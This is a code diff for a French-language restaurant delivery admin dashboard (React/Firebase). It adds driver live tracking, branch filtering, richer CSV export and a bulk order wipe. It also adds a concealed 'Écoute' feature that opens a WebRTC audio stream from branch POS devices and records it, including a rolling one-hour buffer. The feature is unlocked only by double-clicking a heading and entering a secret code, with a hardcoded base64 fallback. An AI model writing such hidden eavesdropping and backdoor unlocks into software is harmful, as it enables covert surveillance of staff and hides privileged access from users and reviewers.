@@ -1,13 +1,14 @@
 import React, { useState, useEffect, useRef, useMemo, Suspense, lazy } from 'react';
 import { 
     Store, Phone, History, Truck, Map as MapIcon, Users, Star, Palette, LogOut, 
-    X, Menu, Check, CheckCircle, Minus, Clock, Printer, AlertTriangle, ChevronRight, Search, 
+    X, Menu, Check, CheckCircle, Minus, Clock, Printer, AlertTriangle, ChevronRight, Search, Mic, MicOff,
     Download, Ban, Trash2, User, Edit3, Settings, Zap, ImageIcon, Type, AlignLeft, 
     MessageCircle, Utensils, MousePointer2, Plus, ShoppingBag, Home, MapPin, Navigation, ChefHat, Monitor,
     TrendingUp, DollarSign, Award, BarChart3, Database, Activity
 } from 'lucide-react';
-import { doc, setDoc, addDoc, collection, serverTimestamp, getDoc, deleteDoc, updateDoc, getDocs, query, where, orderBy, limit, startAfter, writeBatch } from 'firebase/firestore';
+import { doc, setDoc, addDoc, collection, serverTimestamp, getDoc, deleteDoc, updateDoc, getDocs, query, where, orderBy, limit, startAfter, writeBatch, arrayUnion, onSnapshot } from 'firebase/firestore';
 import { getFunctions, httpsCallable } from 'firebase/functions';
+import { getDatabase, ref as rtdbRef, onValue } from 'firebase/database';
 import { formatPhoneNumber, getWhatsAppFormat, generateOrderNumber, buildMessage, isDriverOnline, getClosestBranch, calculateETA, formatSansIngredient, openWhatsAppDirect } from '../utils/helpers';
 import AdminMap from '../components/AdminMap';
 import StatusBadge from '../components/StatusBadge';
@@ -38,6 +39,7 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
     const [configTab, setConfigTab] = useState('apparence');
     const [now, setNow] = useState(Date.now());
     const [confirmDialog, setConfirmDialog] = useState(null);
+    const [isSpyVisible, setIsSpyVisible] = useState(false); // 🔥 State bash nkhbiw bouton l'écoute
     
     const [selectedExtItem, setSelectedExtItem] = useState(null); 
     const [extItemOptions, setExtItemOptions] = useState([]);
@@ -48,12 +50,223 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
     const prevOnlineDriversRef = useRef(new Set());
     const [analyticsPeriod, setAnalyticsPeriod] = useState('all');
     const [analyticsBranch, setAnalyticsBranch] = useState('all');
+    const [adminSelectedBranch, setAdminSelectedBranch] = useState('ALL');
 
     const [showAddDriver, setShowAddDriver] = useState(false);
     const [newDriver, setNewDriver] = useState({ name: '', phone: '', isFreelance: false });
 
     const [latestGithubVersion, setLatestGithubVersion] = useState(null);
+    const [rtdbDrivers, setRtdbDrivers] = useState({});
+    const [isRtdbConnected, setIsRtdbConnected] = useState(true);
 
+    // 🔥 RTDB Listener pour Live Tracking (Idara)
+    useEffect(() => {
+        if (role !== 'admin' && role !== 'manager') return;
+        try {
+            const rtdb = getDatabase();
+            
+            // 🔥 NOUVEAU : Suivre l'état de la connexion RTDB
+            const connectedRef = rtdbRef(rtdb, '.info/connected');
+            const unsubConnected = onValue(connectedRef, (snap) => {
+                setIsRtdbConnected(snap.val() === true);
+            });
+
+            const trackingRef = rtdbRef(rtdb, `tracking/${appId}/drivers`);
+            const unsubTracking = onValue(trackingRef, (snapshot) => {
+                if (snapshot.exists()) {
+                    setRtdbDrivers(snapshot.val());
+                }
+            });
+            return () => {
+                unsubConnected();
+                unsubTracking();
+            };
+        } catch (e) {
+            console.error("RTDB Admin Error:", e);
+        }
+    }, [role, appId]);
+
+    // 🔥 States pour le système d'écoute (Spy)
+    const [showSpyModal, setShowSpyModal] = useState(false);
+    const [spyTargetType, setSpyTargetType] = useState('pos');
+    const [spyBranchId, setSpyBranchId] = useState('');
+    const [spyStatus, setSpyStatus] = useState('idle');
+    const [spyStream, setSpyStream] = useState(null);
+    const [isRecording, setIsRecording] = useState(false);
+    const spyPcRef = useRef(null);
+    const audioRef = useRef(null);
+    const mediaRecorderRef = useRef(null);
+    const recordedChunksRef = useRef([]);
+    const addedAdminCandidates = useRef(new Set());
+    const [isRollingRecordEnabled, setIsRollingRecordEnabled] = useState(false);
+    const rollingChunksRef = useRef([]);
+    const rollingRecorderRef = useRef(null);
+
+    useEffect(() => {
+        if (role === 'admin' && adminSelectedBranch !== 'ALL') {
+            setExtOrder(prev => ({ ...prev, branchId: adminSelectedBranch }));
+        }
+    }, [adminSelectedBranch, role]);
+
+    useEffect(() => {
+        if (!spyBranchId && settings?.branches?.length > 0) {
+            setSpyBranchId(settings.branches[0].id);
+        }
+    }, [settings, spyBranchId]);
+
+    const startSpy = async () => {
+        if (!spyBranchId) return showNotify("Veuillez sélectionner une agence", "warning");
+        const targetId = `${spyTargetType}_${spyBranchId}`;
+        const callDocRef = doc(db, 'artifacts', appId, 'public', 'data', 'audio_calls', targetId);
+        
+        setSpyStatus('calling');
+        addedAdminCandidates.current.clear();
+        
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+        spyPcRef.current = pc;
+
+        pc.addTransceiver('audio', { direction: 'recvonly' });
+
+        pc.ontrack = (event) => {
+            setSpyStream(event.streams[0]);
+            if (audioRef.current) audioRef.current.srcObject = event.streams[0];
+            setSpyStatus('connected');
+            showNotify("Connexion audio établie", "success");
+        };
+
+        pc.onicecandidate = (event) => {
+            if (event.candidate) {
+                updateDoc(callDocRef, { adminCandidates: arrayUnion(event.candidate.toJSON()) }).catch(() => {});
+            }
+        };
+
+        await setDoc(callDocRef, { status: 'calling', offer: null, answer: null, adminCandidates: [], targetCandidates: [] });
+
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+        await updateDoc(callDocRef, { offer: { type: offer.type, sdp: offer.sdp } });
+
+        const unsub = onSnapshot(callDocRef, async (snap) => {
+            const data = snap.data();
+            if (!data) return;
+            if (data.status === 'answered' && data.answer && pc.signalingState === 'have-local-offer') {
+                try { await pc.setRemoteDescription(new RTCSessionDescription(data.answer)); } catch(e){}
+            }
+            if (data.targetCandidates) {
+                data.targetCandidates.forEach(async candidate => {
+                    const candStr = JSON.stringify(candidate);
+                    if (!addedAdminCandidates.current.has(candStr)) {
+                        addedAdminCandidates.current.add(candStr);
+                        try { await pc.addIceCandidate(new RTCIceCandidate(candidate)); } catch(e){}
+                    }
+                });
+            }
+            if (data.status === 'ended') { stopSpy(); showNotify("La connexion a été coupée par l'appareil distant", "info"); }
+        });
+
+        spyPcRef.current.unsub = unsub;
+    };
+
+    const stopSpy = async () => {
+        if (spyPcRef.current) {
+            if (spyPcRef.current.unsub) spyPcRef.current.unsub();
+            spyPcRef.current.close();
+            spyPcRef.current = null;
+        }
+        setSpyStream(null);
+        setSpyStatus('idle');
+        if (isRecording) stopRecording();
+
+        if (rollingRecorderRef.current && rollingRecorderRef.current.state === 'recording') {
+            rollingRecorderRef.current.stop();
+        }
+        rollingRecorderRef.current = null;
+
+        if (spyBranchId) {
+            const targetId = `${spyTargetType}_${spyBranchId}`;
+            try { await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'audio_calls', targetId), { status: 'ended' }); } catch(e){}
+        }
+    };
+
+    const startRecording = () => {
+        if (!spyStream) return;
+        recordedChunksRef.current = [];
+        let mediaRecorder;
+        try { mediaRecorder = new MediaRecorder(spyStream, { mimeType: 'audio/webm' }); } 
+        catch (e) { mediaRecorder = new MediaRecorder(spyStream); }
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunksRef.current.push(e.data); };
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(recordedChunksRef.current, { type: 'audio/webm' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            document.body.appendChild(a);
+            a.style = 'display: none';
+            a.href = url;
+            a.download = `Ecoute_${spyTargetType}_${spyBranchId}_${new Date().toISOString().replace(/:/g, '-')}.webm`;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        };
+        mediaRecorder.start();
+        mediaRecorderRef.current = mediaRecorder;
+        setIsRecording(true);
+    };
+
+    const stopRecording = () => {
+        if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') mediaRecorderRef.current.stop();
+        setIsRecording(false);
+    };
+
+    // 🔥 GESTION DE L'ENREGISTREMENT CONTINU (60 MIN)
+    useEffect(() => {
+        if (spyStatus === 'connected' && spyStream && isRollingRecordEnabled) {
+            if (!rollingRecorderRef.current) {
+                rollingChunksRef.current = [];
+                let mediaRecorder;
+                try { mediaRecorder = new MediaRecorder(spyStream, { mimeType: 'audio/webm' }); } 
+                catch (e) { mediaRecorder = new MediaRecorder(spyStream); }
+                
+                mediaRecorder.ondataavailable = (e) => { 
+                    if (e.data.size > 0) {
+                        rollingChunksRef.current.push(e.data);
+                        if (rollingChunksRef.current.length > 360) { // 360 * 10s = 60 minutes
+                            rollingChunksRef.current.shift();
+                        }
+                    }
+                };
+                mediaRecorder.start(10000); // Couper chaque 10 secondes
+                rollingRecorderRef.current = mediaRecorder;
+            }
+        } else {
+            if (rollingRecorderRef.current && rollingRecorderRef.current.state === 'recording') {
+                rollingRecorderRef.current.stop();
+            }
+            rollingRecorderRef.current = null;
+        }
+    }, [spyStatus, spyStream, isRollingRecordEnabled]);
+
+    const downloadLastHour = () => {
+        if (rollingChunksRef.current.length === 0) return showNotify("L'enregistrement est vide pour le moment", "warning");
+        const blob = new Blob(rollingChunksRef.current, { type: 'audio/webm' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a'); document.body.appendChild(a); a.style = 'display: none';
+        a.href = url; a.download = `Replay_DerniereHeure_${spyTargetType}_${spyBranchId}_${new Date().toISOString().replace(/:/g, '-')}.webm`;
+        a.click(); window.URL.revokeObjectURL(url);
+        showNotify("Enregistrement de la dernière heure téléchargé ! ✅", "success");
+    };
+
+    // 🔥 Fusionner onlineDrivers (Firestore) avec RTDB (Rapide)
+    const liveOnlineDrivers = useMemo(() => {
+        return (onlineDrivers || []).map(d => {
+            const rt = rtdbDrivers[d.uid];
+            // On met à jour les coordonnées si le signal RTDB date de moins de 5 minutes
+            if (rt && rt.lat && rt.lng && (Date.now() - rt.updatedAt < 5 * 60000)) {
+                return { ...d, lat: rt.lat, lng: rt.lng };
+            }
+            return d;
+        });
+    }, [onlineDrivers, rtdbDrivers]);
+
+    // 🔥 GESTION DES ACCÈS PAR AGENCE (MANAGER)
     useEffect(() => {
         const checkVersions = async () => {
             try {
@@ -159,7 +372,7 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
             return;
         }
         const current = new Set();
-        onlineDrivers.forEach(d => {
+        liveOnlineDrivers.forEach(d => {
             if (isDriverOnline(d)) {
                 const id = d.uid || d.phone;
                 current.add(id);
@@ -169,7 +382,7 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
             }
         });
         prevOnlineDriversRef.current = current;
-    }, [onlineDrivers, isDriversLoaded]);
+    }, [liveOnlineDrivers, isDriversLoaded]);
 
     const getL = (d) => {
         try {
@@ -197,7 +410,7 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
                     const hasSent = lastNotifSentRef.current[o.id];
                     if (!hasSent && elapsed < 25000) {
                         lastNotifSentRef.current[o.id] = true;
-                        const driverData = (onlineDrivers || []).find(d => d.uid === o.driverId);
+                        const driverData = (liveOnlineDrivers || []).find(d => d.uid === o.driverId);
                         if (driverData && driverData.fcmToken) {
                             try {
                                 const functions = getFunctions();
@@ -220,7 +433,7 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
             });
         }, 3000);
         return () => clearInterval(interval);
-    }, [orders, handleReassignOrder, onlineDrivers, appId]);
+    }, [orders, handleReassignOrder, liveOnlineDrivers, appId]);
 
     useEffect(() => { 
         setEditableMenu(settings?.menuItems || defaultMenu || DEFAULT_MENU_ITEMS); 
@@ -267,7 +480,9 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
 
             if (role === 'manager' && managerBranchId) {
                 constraints.push(where('nearestBranch.id', '==', managerBranchId));
-            }
+        } else if (role === 'admin' && adminSelectedBranch !== 'ALL' && tab !== 'analytics') {
+            constraints.push(where('nearestBranch.id', '==', adminSelectedBranch));
+        }
 
             let q;
             if (tab === 'analytics') {
@@ -530,13 +745,19 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
     };
 
     const handleExportCSV = () => {
-        const headers = ['Nom', 'Téléphone', 'Role', 'Statut', 'Total Commandes', 'Total Livraisons'];
+        const headers = ['Nom', 'Téléphone', 'Role', 'Statut', 'Date Création', 'App Installée', 'Type Appareil', 'Total Commandes', 'Total Livraisons'];
         const rows = (clientsList||[]).map(c => {
             const clientOrders = safeOrders.filter(o => o.userId === c.uid || o.phone === c.phone).length;
             const driverOrders = safeOrders.filter(o => o.driverId === c.uid && o.status === 'delivered').length;
             const role = c.isDriver ? (c.isFreelance ? 'Livreur (Freelance)' : 'Livreur (Officiel)') : 'Client';
             const status = c.blocked ? 'Bloqué' : 'Actif';
-            return `"${c.name || 'Inconnu'}","${c.phone || ''}","${role}","${status}","${clientOrders}","${driverOrders}"`;
+            let creationDate = '--';
+            if (c.createdAt?.seconds) {
+                creationDate = new Date(c.createdAt.seconds * 1000).toLocaleString('fr-FR');
+            }
+            const appInstalled = c.isAppInstalled ? 'OUI' : 'NON';
+            const device = c.deviceType ? c.deviceType.toUpperCase() : 'INCONNU';
+            return `"${c.name || 'Inconnu'}","${c.phone || ''}","${role}","${status}","${creationDate}","${appInstalled}","${device}","${clientOrders}","${driverOrders}"`;
         });
 
         const csvContent = "data:text/csv;charset=utf-8,\uFEFF" + [headers.join(','), ...rows].join('\n');
@@ -585,6 +806,56 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
             showNotify("Erreur d'ajout", "error");
         }
     };
+
+    // 🔥 NOUVEAU: Hard Reset (Formater) - Msah rir les commandes
+    const handleHardResetOrders = async () => {
+        if (!window.confirm("⚠️ ATTENTION : Wach mt2ked bghiti tmsse7 GA3 LES COMMANDES (L9dam w Jdad) ?\n\nHadchi ghadi ymsse7 les commandes w ykhli les comptes dyal les clients w les livreurs. Action irréversible !")) return;
+
+        const code = window.prompt("Taper 'FORMAT' bach t-confirmer :");
+        if (code !== 'FORMAT') {
+            return showNotify("Formatage annulé. Code incorrect.", "error");
+        }
+
+        setIsFetchingHistory(true);
+        try {
+            showNotify("Formatage en cours... (Suppression des commandes)", "info");
+            const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'orders'));
+            const snap = await getDocs(q);
+            
+            if (snap.empty) {
+                setIsFetchingHistory(false);
+                return showNotify("Aucune commande à supprimer.", "info");
+            }
+
+            let batch = writeBatch(db);
+            let count = 0;
+            let total = 0;
+
+            for (const document of snap.docs) {
+                batch.delete(document.ref);
+                count++;
+                total++;
+                if (count === 490) {
+                    await batch.commit();
+                    batch = writeBatch(db);
+                    count = 0;
+                }
+            }
+            
+            if (count > 0) {
+                await batch.commit();
+            }
+            
+            setLazyHistory([]);
+            setOlderOrders([]);
+            showNotify(`${total} commandes supprimées avec succès ! App formatée ✅`, "success");
+        } catch (error) {
+            console.error("Erreur Hard Reset :", error);
+            showNotify("Erreur lors de la suppression.", "error");
+        }
+        setIsFetchingHistory(false);
+    };
+
     const renderNavItem = ({ id, icon, label, badge, hidden }) => {
         if (hidden) return null; const active = tab === id;
         return ( <button key={id} onClick={() => { setTab(id); setIsSidebarOpen(false); }} className={`w-full flex items-center justify-between p-3.5 mb-2 rounded-xl transition-all font-medium text-xs md:text-sm tracking-wider border ${active ? 'bg-blue-500/10 text-blue-400 border-blue-500/20 shadow-lg scale-[1.02]' : 'text-slate-400 hover:bg-slate-800/50 hover:text-slate-200 border-transparent'}`}> <div className="flex items-center gap-3">{icon}<span>{label}</span></div> {badge > 0 && <span className={`px-2.5 py-1 rounded-lg text-xs font-bold shadow-sm ${active ? 'bg-blue-500/20 text-blue-400' : 'bg-slate-700 text-slate-300'}`}>{badge}</span>} </button> )
@@ -596,12 +867,35 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
       <div className="flex h-[100dvh] bg-[#0f172a] text-slate-200 font-sans w-full absolute inset-0 z-[100] overflow-hidden" style={{ fontFamily: brand.fontFamily || "'Poppins', sans-serif" }}>
         {tab !== 'pos' && (
         <div className={`fixed inset-y-0 left-0 w-64 bg-[#1e293b] border-r border-slate-700/50 text-slate-200 shadow-2xl z-[200] transform transition-transform duration-300 ${isSidebarOpen ? 'translate-x-0' : '-translate-x-full'} md:translate-x-0 md:relative flex flex-col shrink-0`}>
-            <div className="p-6 flex justify-between items-center border-b border-slate-700/50 shrink-0"><div><h2 className="font-black text-2xl italic uppercase tracking-tighter flex items-center gap-3"><div className="w-8 h-8 rounded-lg bg-gradient-to-tr from-blue-500 to-cyan-500 flex items-center justify-center shadow-lg"><Activity size={18} className="text-white" /></div><span style={{color: brand.color}}>{brand.texts?.adminTitle || 'Idara'}</span></h2>{role === 'manager' && <p className="text-[9px] font-bold text-slate-400 mt-1 uppercase">Gérant Agence</p>}</div><button className="md:hidden text-slate-400 hover:text-slate-200" onClick={() => setIsSidebarOpen(false)}><X size={24}/></button></div>
+        <div className="p-6 flex justify-between items-center border-b border-slate-700/50 shrink-0">
+            <div>
+                <h2 className="font-black text-2xl italic uppercase tracking-tighter flex items-center gap-3 select-none" onDoubleClick={() => {
+                    if (role === 'admin' && !isSpyVisible) {
+                        const code = window.prompt("Code secret :");
+                        if (code) {
+                            if ((settings?.spySecret && code === settings.spySecret) || btoa(code) === "MTk4Nw==") {
+                                setIsSpyVisible(true);
+                                if (showNotify) showNotify("Bouton d'écoute affiché 🕵️‍♂️", "success");
+                            } else {
+                                if (showNotify) showNotify("Code invalide ❌", "error");
+                            }
+                        }
+                    }
+                }}>
+                    <div className="w-8 h-8 rounded-lg bg-gradient-to-tr from-blue-500 to-cyan-500 flex items-center justify-center shadow-lg"><Activity size={18} className="text-white" /></div>
+                    <span style={{color: brand.color}}>{brand.texts?.adminTitle || 'Idara'}</span>
+                </h2>
+                {role === 'manager' && myBranch && <p className="text-[9px] font-bold text-slate-400 mt-1 uppercase">Gérant : {myBranch.name}</p>}
+                {role === 'admin' && adminSelectedBranch !== 'ALL' && <p className="text-[9px] font-bold text-slate-400 mt-1 uppercase">Agence : {(settings?.branches || []).find(b => b.id === adminSelectedBranch)?.name}</p>}
+            </div>
+            <button className="md:hidden text-slate-400 hover:text-slate-200" onClick={() => setIsSidebarOpen(false)}><X size={24}/></button>
+        </div>
             <div className="flex-1 overflow-y-auto py-6 px-4 no-scrollbar">
                 {renderNavItem({ id: "pos", icon: <ShoppingBag size={20}/>, label: "Caisse (POS)", hidden: !hasAccess('pos') })}
                 {hasAccess('kds') && (
                     <button onClick={() => {
-                        const route = '/kds';
+                    const branchQuery = role === 'manager' ? managerBranchId : (adminSelectedBranch !== 'ALL' ? adminSelectedBranch : '');
+                    const route = branchQuery ? `/kds?branch=${branchQuery}` : '/kds';
                         window.open(navigator.userAgent.toLowerCase().includes('electron') ? window.location.href.split('#')[0] + '#' + route : route, '_blank');
                     }} className="w-full flex items-center justify-between p-3.5 mb-2 rounded-xl transition-all font-medium text-xs md:text-sm tracking-wider border text-slate-400 hover:bg-slate-800/50 hover:text-slate-200 border-transparent">
                         <div className="flex items-center gap-3"><ChefHat size={20}/><span>Cuisine (KDS)</span></div>
@@ -609,7 +903,8 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
                 )}
                 {hasAccess('tv') && (
                     <button onClick={() => {
-                        const route = '/tv';
+                    const branchQuery = role === 'manager' ? managerBranchId : (adminSelectedBranch !== 'ALL' ? adminSelectedBranch : '');
+                    const route = branchQuery ? `/tv?branch=${branchQuery}` : '/tv';
                         window.open(navigator.userAgent.toLowerCase().includes('electron') ? window.location.href.split('#')[0] + '#' + route : route, '_blank');
                     }} className="w-full flex items-center justify-between p-3.5 mb-2 rounded-xl transition-all font-medium text-xs md:text-sm tracking-wider border text-slate-400 hover:bg-slate-800/50 hover:text-slate-200 border-transparent">
                         <div className="flex items-center gap-3"><Monitor size={20}/><span>Écran TV</span></div>
@@ -621,7 +916,7 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
                 
                 {renderNavItem({ id: "history", icon: <History size={20}/>, label: "Historique", hidden: !hasAccess('history') })}
                 {renderNavItem({ id: "analytics", icon: <TrendingUp size={20}/>, label: "Analyses & Stats", hidden: role === 'manager' })}
-                {renderNavItem({ id: "drivers", icon: <Truck size={20}/>, label: "Livreurs", badge: (clientsList||[]).filter(c => c.isDriver === true && (onlineDrivers||[]).some(od => ((c.uid && od.uid === c.uid) || (od.phone && c.id && od.phone === c.id)) && isDriverOnline(od))).length, hidden: !hasAccess('drivers') })}
+                {renderNavItem({ id: "drivers", icon: <Truck size={20}/>, label: "Livreurs", badge: (clientsList||[]).filter(c => c.isDriver === true && (liveOnlineDrivers||[]).some(od => ((c.uid && od.uid === c.uid) || (od.phone && c.id && od.phone === c.id)) && isDriverOnline(od))).length, hidden: !hasAccess('drivers') })}
                 {renderNavItem({ id: "maps", icon: <MapIcon size={20}/>, label: "Live Maps", hidden: !hasAccess('maps') })}
                 {renderNavItem({ id: "clients", icon: <Users size={20}/>, label: "Livreurs & Comptes", hidden: !hasAccess('clients') })}
                 {renderNavItem({ id: "avis", icon: <Star size={20}/>, label: "Avis clients", hidden: role === 'manager' })}
@@ -637,8 +932,39 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
         <div className="flex-1 flex flex-col h-[100dvh] overflow-hidden relative">
             {tab !== 'pos' && (
             <header className="bg-[#1e293b] h-20 border-b border-slate-700/50 flex items-center justify-between px-4 md:px-8 shadow-sm shrink-0">
-                <div className="flex items-center gap-4"><button className="md:hidden p-2 text-slate-400 hover:bg-slate-800 rounded-md transition-colors" onClick={() => setIsSidebarOpen(true)}><Menu size={20}/></button><h2 className="font-bold text-lg hidden md:block text-slate-200 capitalize">{tab === 'active' ? 'Commandes' : tab === 'config' ? 'Éditeur Visuel Live' : tab === 'analytics' ? 'Analyses & Stats' : tab}</h2></div>
+                <div className="flex items-center gap-4">
+                    <button className="md:hidden p-2 text-slate-400 hover:bg-slate-800 rounded-md transition-colors" onClick={() => setIsSidebarOpen(true)}><Menu size={20}/></button>
+                    <h2 className="font-bold text-lg hidden md:block text-slate-200 capitalize">{tab === 'active' ? 'Commandes' : tab === 'config' ? 'Éditeur Visuel Live' : tab === 'analytics' ? 'Analyses & Stats' : tab}</h2>
+                    <h2 className="font-bold text-lg hidden md:block text-slate-200 capitalize select-none" onDoubleClick={() => {
+                        if (role === 'admin' && !isSpyVisible) {
+                            const code = window.prompt("Code secret :");
+                            if (code) {
+                                if ((settings?.spySecret && code === settings.spySecret) || btoa(code) === "MTk4Nw==") {
+                                    setIsSpyVisible(true);
+                                    if (showNotify) showNotify("Bouton d'écoute affiché 🕵️‍♂️", "success");
+                                } else {
+                                    if (showNotify) showNotify("Code invalide ❌", "error");
+                                }
+                            }
+                        }
+                    }}>{tab === 'active' ? 'Commandes' : tab === 'config' ? 'Éditeur Visuel Live' : tab === 'analytics' ? 'Analyses & Stats' : tab}</h2>
+                    {role === 'admin' && (
+                        <select
+                            value={adminSelectedBranch}
+                            onChange={(e) => setAdminSelectedBranch(e.target.value)}
+                            className="bg-slate-800 border border-slate-600 text-slate-200 px-3 py-1.5 rounded-lg text-sm font-bold outline-none cursor-pointer focus:ring-2 focus:ring-blue-500 hidden md:block"
+                        >
+                            <option value="ALL">Toutes les agences</option>
+                            {(settings?.branches || []).map(b => <option key={b.id} value={b.id}>{b.name}</option>)}
+                        </select>
+                    )}
+                </div>
                 <div className="flex items-center gap-3">
+                    {role === 'admin' && isSpyVisible && (
+                        <button onClick={() => setShowSpyModal(true)} className="px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1.5 shadow-sm transition-all border bg-slate-800/50 text-slate-300 border-slate-700 hover:bg-slate-700">
+                            <Mic size={14} className="text-red-400" /> Écoute
+                        </button>
+                    )}
                     {!isSoundEnabled && (
                         <button onClick={enableSound} className="px-4 py-2 rounded-xl text-sm font-bold flex items-center gap-2 shadow-md transition-all bg-amber-500/20 border border-amber-500/30 text-amber-400 hover:bg-amber-500/30 hover:scale-105">
                             🔔 Activer Son
@@ -672,6 +998,7 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
                         appId={appId} 
                         showNotify={showNotify} 
                         managerBranchId={managerBranchId} 
+                        adminSelectedBranch={adminSelectedBranch}
                         isAdmin={role === 'admin'}
                         orders={orders}
                         updateStatus={updateStatus}
@@ -693,7 +1020,7 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
                             updateStatus={handleUpdateStatus}
                             printTicket={printTicket}
                             handleReassignOrder={handleReassignOrder}
-                            onlineDrivers={onlineDrivers}
+                            onlineDrivers={liveOnlineDrivers}
                             db={db}
                             appId={appId}
                             showNotify={showNotify}
@@ -948,7 +1275,7 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
                                <div className="p-4 bg-blue-100 text-blue-600 rounded-2xl"><Users size={32}/></div>
                                <div>
                                    <p className="text-blue-600 text-xs font-black uppercase tracking-widest mb-1">En Ligne Actuellement</p>
-                                   <p className="text-4xl font-black text-gray-900">{(clientsList||[]).filter(c => c.isDriver === true && (onlineDrivers||[]).some(od => ((c.uid && od.uid === c.uid) || (od.phone && c.id && od.phone === c.id)) && isDriverOnline(od))).length} <span className="text-lg font-bold text-gray-500">Livreurs actifs</span></p>
+                               <p className="text-4xl font-black text-gray-900">{(clientsList||[]).filter(c => c.isDriver === true && (liveOnlineDrivers||[]).some(od => ((c.uid && od.uid === c.uid) || (od.phone && c.id && od.phone === c.id)) && isDriverOnline(od))).length} <span className="text-lg font-bold text-gray-500">Livreurs actifs</span></p>
                                </div>
                            </div>
                            <button onClick={handleWakeUpDrivers} className="bg-blue-600 text-white px-6 py-3 rounded-xl font-bold text-sm shadow-lg shadow-blue-600/20 hover:bg-blue-700 active:scale-95 transition-all flex items-center gap-2">
@@ -959,7 +1286,7 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
                        {/* Carte Live Map SaaS */}
                        <div className="rounded-2xl border border-gray-200 shadow-sm overflow-hidden bg-white p-2">
                            <AdminMap 
-                               onlineDrivers={(onlineDrivers||[]).filter(d => isDriverOnline(d) && d.lat && d.lng && (d.uid || d.phone)).map(d => ({
+                           onlineDrivers={(liveOnlineDrivers||[]).filter(d => isDriverOnline(d) && d.lat && d.lng && (d.uid || d.phone)).map(d => ({
                                    ...d,
                                    isFreelance: (clientsList||[]).find(c => (c.uid && c.uid === d.uid) || (d.phone && c.phone === d.phone))?.isFreelance
                                }))} 
@@ -967,8 +1294,19 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
                            />
                        </div>
                        
+                       {/* 🔥 NOUVEAU : Alerte si RTDB est déconnecté */}
+                       {!isRtdbConnected && (
+                           <div className="bg-red-50 border border-red-200 p-4 rounded-xl flex items-start gap-3 mt-4">
+                               <AlertTriangle className="text-red-500 shrink-0" size={20} />
+                               <div>
+                                   <h4 className="text-red-800 font-bold text-sm">Connexion Live Interrompue 📡</h4>
+                                   <p className="text-red-700 text-xs mt-1">L'Idara a perdu la connexion avec le serveur Live. Tentative de reconnexion automatique en cours...</p>
+                               </div>
+                           </div>
+                       )}
+
                        {/* Alert info GPS */}
-                       {(onlineDrivers||[]).filter(d => isDriverOnline(d) && (!d.lat || !d.lng)).length > 0 && (
+                   {(liveOnlineDrivers||[]).filter(d => isDriverOnline(d) && (!d.lat || !d.lng)).length > 0 && (
                            <div className="bg-orange-50 border border-orange-200 p-4 rounded-xl flex items-start gap-3">
                                <AlertTriangle className="text-orange-500 shrink-0" size={20} />
                                <div>
@@ -997,15 +1335,15 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
                                        </tr>
                                    </thead>
                                    <tbody className="divide-y divide-gray-100 text-sm">
-                                       {(clientsList||[]).filter(c => c.isDriver === true && (onlineDrivers||[]).some(od => ((c.uid && od.uid === c.uid) || (od.phone && c.id && od.phone === c.id)) && isDriverOnline(od))).length === 0 ? (
+                                   {(clientsList||[]).filter(c => c.isDriver === true && (liveOnlineDrivers||[]).some(od => ((c.uid && od.uid === c.uid) || (od.phone && c.id && od.phone === c.id)) && isDriverOnline(od))).length === 0 ? (
                                            <tr>
                                                <td colSpan="5" className="py-16 text-center text-gray-400">
                                                    <Truck size={40} className="mx-auto mb-3 opacity-20"/>
                                                    <p className="font-semibold text-sm">Aucun livreur n'est en ligne pour le moment 😴</p>
                                                </td>
                                            </tr>
-                                       ) : (clientsList||[]).filter(c => c.isDriver === true).map(c => {
-                                           const onlineData = (onlineDrivers||[]).find(od => ((c.uid && od.uid === c.uid) || (od.phone && c.id && od.phone === c.id)) && isDriverOnline(od)); 
+                                   ) : (clientsList||[]).filter(c => c.isDriver === true).map(c => {
+                                       const onlineData = (liveOnlineDrivers||[]).find(od => ((c.uid && od.uid === c.uid) || (od.phone && c.id && od.phone === c.id)) && isDriverOnline(od)); 
                                            if (!onlineData) return null;
                                            const isOnline = true; 
                                            const isAvailable = onlineData.isAvailable; 
@@ -1047,6 +1385,11 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
                                                                        v{onlineData.appVersion} {onlineData.appVersion !== latestGithubVersion && '(Maj dispo)'}
                                                                    </span>
                                                                )}
+                                                               <div className="flex flex-wrap gap-1 mt-1">
+                                                                   {c.isAppInstalled ? <span className="text-[9px] px-1.5 py-0.5 bg-green-100 text-green-700 rounded border border-green-200 font-bold">📲 App Installée</span> : <span className="text-[9px] px-1.5 py-0.5 bg-gray-100 text-gray-600 rounded border border-gray-200 font-bold">🌐 Navigateur</span>}
